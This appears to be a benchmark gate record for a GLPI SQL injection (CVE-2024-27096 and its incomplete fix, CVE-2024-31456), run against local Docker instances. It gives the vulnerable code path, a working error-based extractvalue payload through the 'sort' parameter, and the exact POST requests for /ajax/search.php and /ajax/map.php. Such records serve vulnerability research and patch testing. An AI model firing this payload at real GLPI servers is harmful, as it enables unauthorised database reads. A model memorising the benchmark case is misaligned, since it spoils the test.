PatchClosure-Bench gate — glpi-search-constructsql-sqli
CVE-2024-27096 (original)  ->  CVE-2024-31456 (residual / incomplete fix)
Oracle: flag_oracle.validate_case (Variant A). Real Docker (php:7.4-apache + mariadb:10.11).
Run: 2026-07-13, `python3 oracle.py --run-gate` (v0/v1/v2 built, canary planted, differential, torn down).

VERSIONS
  V0 = GLPI 10.0.12  (pre CVE-2024-27096)      http://127.0.0.1:39820
  V1 = GLPI 10.0.14  (CVE-2024-27096 fixed)    http://127.0.0.1:39821   <- TARGET (incomplete fix)
  V2 = GLPI 10.0.15  (CVE-2024-31456 fixed)    http://127.0.0.1:39822

SINK (identical for seed and residual)
  Search::addSelect() builds the SELECT column alias  ... AS `ITEM_<itemtype>_<ID>` ...
  where <ID> is an element of the `sort` param, reached via
  Search::prepareDatasForSearch() -> constructSQL()/constructData().
  A `sort` element `1`,extractvalue(...)-- -` closes the backtick alias and injects SQL.

  Search.php line ~3690 in the leaked query is the addSelect() alias site.

PAYLOAD (sort element, same for both paths)
  1`,extractvalue(rand(),concat(0x7e,(SELECT secret FROM pcb_canary LIMIT 1)))-- -
  -> error-based read of the RESTRICTED canary table pcb_canary.secret (= ${PCB_FLAG}).
  Reflected because the seeded admin (glpi) is in GLPI DEBUG mode: ErrorHandler outputs
  `SQL Error "1105": XPATH syntax error: '~<flag>' in query "SELECT DISTINCT ..."`.
  (MySQL extractvalue() truncates to ~31 chars => the planted flag is kept short: PCB + 16 hex.)

VERSION EVOLUTION (verbatim, from real src/Search.php at each tag)
  * manageParams() tail — the CVE-2024-27096 fix, introduced in 10.0.13 (ABSENT in 10.0.10/11/12):
        $int_params = ['sort'];
        foreach ($params as $key => &$val) {
            if (in_array($key, $int_params)) {
                if (is_array($val)) { foreach ($val as &$subval) { $subval = (int)$subval; } }
                else { $val = (int)$val; }
            }
        }
    -> the NORMAL search path (/ajax/search.php -> manageParams) int-casts every `sort` element.
    Search.php is BYTE-IDENTICAL between 10.0.13 and 10.0.14 (md5 3decee1495541e51b0dbf74abcdcc731).

  * prepareDatasForSearch() `case 'sort':` (all of 10.0.12/13/14) — only a SCALAR is int-cast;
    an ARRAY passes through unsanitised:
        case 'sort':
            if (!is_array($val)) { $val = (int) $val; if ($val >= 0) { $p[$key] = [$val]; } break; }
            $p[$key] = $val;   // array => passed through
    /ajax/map.php calls prepareDatasForSearch() WITHOUT manageParams(), so params[sort][] reaches the sink.

  * 10.0.15 (the CVE-2024-31456 fix) adds, inside prepareDatasForSearch():
        $p = self::cleanParams($p);
    and defines Search::cleanParams(), which int-casts every element of an array `sort`
    ($int_params = ['sort']). This closes the /ajax/map.php path on V2.

REQUEST FORMS
  Seed  (CVE-2024-27096)  POST /ajax/search.php
        action=display_results & itemtype=User & sort[]=<payload> & _glpi_csrf_token=<tok>
  Residual (CVE-2024-31456) POST /ajax/map.php
        itemtype=User & params[sort][]=<payload> & _glpi_csrf_token=<tok>   (X-Glpi-Csrf-Token header)
  Auth = login glpi/glpi (setup only); the SQLi is the vulnerability.

